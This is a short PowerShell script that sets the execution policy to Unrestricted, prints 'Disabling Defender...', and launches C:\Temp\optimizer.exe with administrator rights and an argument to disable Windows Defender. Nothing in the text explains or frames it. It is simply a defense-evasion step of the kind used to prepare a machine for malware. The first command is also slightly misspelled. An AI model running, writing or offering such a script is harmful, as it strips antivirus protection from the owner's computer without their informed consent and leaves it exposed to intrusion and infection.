Set Execution-Policy Unrestricted

Write-Output "Disabling Defender..."
Start-Sleep -Seconds 2
Start-Process cmd -ArgumentList "/c C:\Temp\optimizer.exe /restart=disabledefender" -Verb runAs